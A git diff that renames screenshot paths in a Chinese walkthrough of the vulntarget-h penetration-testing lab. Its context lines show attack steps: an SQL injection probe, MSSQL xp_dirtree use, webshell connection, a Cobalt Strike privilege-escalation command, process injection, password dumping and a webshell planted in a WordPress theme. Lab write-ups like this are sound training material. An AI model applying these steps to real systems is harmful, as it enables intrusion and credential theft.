@@ -221,13 +221,13 @@ DOWNLOADED: 4612 - FOUND: 1
 
 + 打开发现网站提示我们该网站存在SQL注入。
 
-![截图_2022-06-30_17-46-50.png](../images/vulntarget-h-WriteUp/截图_2022-06-30_17-46-50.png)
+![截图_2022-06-30_17-46-50.png](../images/vulntarget-h%20write-up/截图_2022-06-30_17-46-50.png)
 
 + 判断该网站是否存在SQL注入。存在数字型注入。
 
 > http://192.168.1.99/?user_id=1%20and%201=2
 
-![Screenshot_2022-06-30_05-54-25.png](../images/vulntarget-h-WriteUp/Screenshot_2022-06-30_05-54-25.png)
+![Screenshot_2022-06-30_05-54-25.png](../images/vulntarget-h%20write-up/Screenshot_2022-06-30_05-54-25.png)
 
 + 获取当前用户信息。
 
@@ -311,7 +311,7 @@ DOWNLOADED: 4612 - FOUND: 1
 > insert into tmp(dir,num,num1) execute master..xp_dirtree 'c:\inetpub\',1,1;
 > ```
 > 
-> ![Screenshot_2022-06-30_10-06-00.png](../images/vulntarget-h-WriteUp/Screenshot_2022-06-30_10-06-00.png)
+> ![Screenshot_2022-06-30_10-06-00.png](../images/vulntarget-h%20write-up/Screenshot_2022-06-30_10-06-00.png)
 > 
 > + 使用`sqlmap`查看刚才插入的数据。
 > 
@@ -367,7 +367,7 @@ DOWNLOADED: 4612 - FOUND: 1
 > 
 > + 使用蚁剑链接上我们刚才上传的shell。
 > 
-> ![Screenshot_2022-06-30_10-29-41.png](../images/vulntarget-h-WriteUp/Screenshot_2022-06-30_10-29-41.png)
+> ![Screenshot_2022-06-30_10-29-41.png](../images/vulntarget-h%20write-up/Screenshot_2022-06-30_10-29-41.png)
 > 
 > ##### 提升权限
 > 
@@ -382,13 +382,13 @@ DOWNLOADED: 4612 - FOUND: 1
 > 
 > + 上线成功。
 > 
-> ![Screenshot_2022-07-01_04-02-11.png](../images/vulntarget-h-WriteUp/Screenshot_2022-07-01_04-02-11.png)
+> ![Screenshot_2022-07-01_04-02-11.png](../images/vulntarget-h%20write-up/Screenshot_2022-07-01_04-02-11.png)
 > 
 > > 上面教程参考于：[MSSQL注入绕过360执行命令](https://macchiato.ink/web/web_security/mssql_bypass/#0x03-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87)
 > 
 > + 抓取Windows Server 2008密码。
 > 
-> ![Screenshot_2022-07-01_04-07-48.png](../images/vulntarget-h-WriteUp/Screenshot_2022-07-01_04-07-48.png)
+> ![Screenshot_2022-07-01_04-07-48.png](../images/vulntarget-h%20write-up/Screenshot_2022-07-01_04-07-48.png)
 > 
 > + 开启代理移动到Windows 7。
 
@@ -615,7 +615,7 @@ Nmap done: 1 IP address (1 host up) scanned in 1188.52 seconds
 └─$ proxychains4 firefox 192.168.153.128
 ```
 
-![截图_2022-07-02_15-08-05.png](../images/vulntarget-h-WriteUp/截图_2022-07-02_15-08-05.png)
+![截图_2022-07-02_15-08-05.png](../images/vulntarget-h%20write-up/截图_2022-07-02_15-08-05.png)
 
 + 从上面的返回的结果我们可以看到这是需要我们通过命令注入查看`c:\phpstudy_pro\COM\a.txt`文件的内容。由于这里使用`exec`函数并没有返回数据。
 
@@ -723,11 +723,11 @@ Nmap done: 1 IP address (1 host up) scanned in 1188.52 seconds
 > 
 > + 在生成木马之前我们需要创建一个监听器。
 > 
-> ![Screenshot_2022-07-02_07-10-45.png](../images/vulntarget-h-WriteUp/Screenshot_2022-07-02_07-10-45.png)
+> ![Screenshot_2022-07-02_07-10-45.png](../images/vulntarget-h%20write-up/Screenshot_2022-07-02_07-10-45.png)
 > 
 > + 你可以能会疑惑为什么需要把监听地址改为**192.168.153.130**。因为Windows Server 2008有两个网卡其中一个网卡是不能和Windows 7通信，**192.168.153.130**这个网卡是可以和Windows 7通信。
 > 
-> ![Screenshot_2022-07-02_07-11-12.png](../images/vulntarget-h-WriteUp/Screenshot_2022-07-02_07-11-12.png)
+> ![Screenshot_2022-07-02_07-11-12.png](../images/vulntarget-h%20write-up/Screenshot_2022-07-02_07-11-12.png)
 > 
 > + 由于我们这个反向连接需要在Windows Sever 2008开放4444端口否则会无法连接。
 > 
@@ -752,13 +752,13 @@ Nmap done: 1 IP address (1 host up) scanned in 1188.52 seconds
 > 
 > + 使用蚁剑连接`dsuijaddjsfvos.php`文件的一句话木马。在连接一句话木马之前需要配置一下蚁剑的代理。
 > 
-> ![Screenshot_2022-07-02_06-59-12.png](../images/vulntarget-h-WriteUp/Screenshot_2022-07-02_06-59-12.png)
+> ![Screenshot_2022-07-02_06-59-12.png](../images/vulntarget-h%20write-up/Screenshot_2022-07-02_06-59-12.png)
 > 
-> ![Screenshot_2022-07-02_06-59-45.png](../images/vulntarget-h-WriteUp/Screenshot_2022-07-02_06-59-45.png)
+> ![Screenshot_2022-07-02_06-59-45.png](../images/vulntarget-h%20write-up/Screenshot_2022-07-02_06-59-45.png)
 > 
 > + 执行木马。这里你可以通过上图目录空白右击鼠标打开菜单找到打开终端选项运行木马。
 > 
-> ![Screenshot_2022-07-02_08-02-35.png](../images/vulntarget-h-WriteUp/Screenshot_2022-07-02_08-02-35.png)
+> ![Screenshot_2022-07-02_08-02-35.png](../images/vulntarget-h%20write-up/Screenshot_2022-07-02_08-02-35.png)
 > 
 > + 提升权限。
 > 
@@ -817,19 +817,19 @@ Nmap done: 1 IP address (1 host up) scanned in 1188.52 seconds
 > 
 > + 尝试进程注入，在注入之前需要找到可以注入的进程。
 > 
-> ![Screenshot_2022-07-02_08-12-47.png](../images/vulntarget-h-WriteUp/Screenshot_2022-07-02_08-12-47.png)
+> ![Screenshot_2022-07-02_08-12-47.png](../images/vulntarget-h%20write-up/Screenshot_2022-07-02_08-12-47.png)
 > 
 > + 在进程列表找到**phpStudyServer.exe**的进程，我们就尝试注入这个进程吧。
 > 
-> ![Screenshot_2022-07-02_08-16-41.png](../images/vulntarget-h-WriteUp/Screenshot_2022-07-02_08-16-41.png)
+> ![Screenshot_2022-07-02_08-16-41.png](../images/vulntarget-h%20write-up/Screenshot_2022-07-02_08-16-41.png)
 > 
 > + 成功注入**phpStudyServer.exe**进程。
 > 
-> ![Screenshot_2022-07-02_08-17-04.png](../images/vulntarget-h-WriteUp/Screenshot_2022-07-02_08-17-04.png)
+> ![Screenshot_2022-07-02_08-17-04.png](../images/vulntarget-h%20write-up/Screenshot_2022-07-02_08-17-04.png)
 > 
 > + 抓取明文密码。
 > 
-> ![Screenshot_2022-07-02_08-22-16.png](../images/vulntarget-h-WriteUp/Screenshot_2022-07-02_08-22-16.png)
+> ![Screenshot_2022-07-02_08-22-16.png](../images/vulntarget-h%20write-up/Screenshot_2022-07-02_08-22-16.png)
 
 ### Windws 10
 
@@ -1117,25 +1117,25 @@ Trying root / 333333 Time: 00:04:30 <===========================================
 
 + 我目前的密码字典目前不能破解。只能看看会不会有密码泄漏，在靶场搭建页面有密码我们我们就使用该密码尝试登陆。
 
-![Screenshot_2022-07-02_10-51-22.png](../images/vulntarget-h-WriteUp/Screenshot_2022-07-02_10-51-22.png)
+![Screenshot_2022-07-02_10-51-22.png](../images/vulntarget-h%20write-up/Screenshot_2022-07-02_10-51-22.png)
 
 #### 上传木马
 
 + 接下来我们就可以通过**主题文件编辑器**功能写入一句话木马。
 
-![Screenshot_2022-07-02_11-02-37.png](../images/vulntarget-h-WriteUp/Screenshot_2022-07-02_11-02-37.png)
+![Screenshot_2022-07-02_11-02-37.png](../images/vulntarget-h%20write-up/Screenshot_2022-07-02_11-02-37.png)
 
 + 我选择在`inc/patterns/hidden-404.php`文件写入命令执行。
 
-![Screenshot_2022-07-02_11-31-18.png](../images/vulntarget-h-WriteUp/Screenshot_2022-07-02_11-31-18.png)
+![Screenshot_2022-07-02_11-31-18.png](../images/vulntarget-h%20write-up/Screenshot_2022-07-02_11-31-18.png)
 
 + 测试写入的代码是否可以执行。
 
-![Screenshot_2022-07-02_11-33-03.png](../images/vulntarget-h-WriteUp/Screenshot_2022-07-02_11-33-03.png)
+![Screenshot_2022-07-02_11-33-03.png](../images/vulntarget-h%20write-up/Screenshot_2022-07-02_11-33-03.png)
 
 + 将上传Windows 7的木马到Windows 10。这里通过在WordPress官网下载随便一个插件然后把我们的木马放进压缩包再上传。
 
-![Screenshot_2022-07-02_12_13_31.png](../images/vulntarget-h-WriteUp/Screenshot_2022-07-02_12_13_31.png)
+![Screenshot_2022-07-02_12_13_31.png](../images/vulntarget-h%20write-up/Screenshot_2022-07-02_12_13_31.png)
 
 + 然后通过我们在主题写入命令执行该文件就可以了。
 
@@ -1154,7 +1154,7 @@ Trying root / 333333 Time: 00:04:30 <===========================================
   <meta name="keywords" content="">
 ```
 
-![Screenshot_2022-07-02_12_27_30.png](../images/vulntarget-h-WriteUp/Screenshot_2022-07-02_12_27_30.png)
+![Screenshot_2022-07-02_12_27_30.png](../images/vulntarget-h%20write-up/Screenshot_2022-07-02_12_27_30.png)
 
 + 提升到SYSTEM权限。
 
@@ -1167,7 +1167,7 @@ beacon> elevate svc-exe b_192.168.153.130
 Started service ba77d60 on .
 ```
 
-![Screenshot_2022-07-02_12-30-57.png](../images/vulntarget-h-WriteUp/Screenshot_2022-07-02_12-30-57.png)
+![Screenshot_2022-07-02_12-30-57.png](../images/vulntarget-h%20write-up/Screenshot_2022-07-02_12-30-57.png)
 
 + 接下来就是抓取明文密码了。由于Windows 10抓取密码方式不一样，需要先修改注册表等待重新登陆再截取dmp文件。
 
@@ -1275,6 +1275,6 @@ Bye!
 
 + 尝试使用CS抓取明文密码功能发现可以直接抓到。
 
-![Screenshot_2022-07-02_23-43-19.png](../images/vulntarget-h-WriteUp/Screenshot_2022-07-02_23-43-19.png)
+![Screenshot_2022-07-02_23-43-19.png](../images/vulntarget-h%20write-up/Screenshot_2022-07-02_23-43-19.png)
 
 ## 完
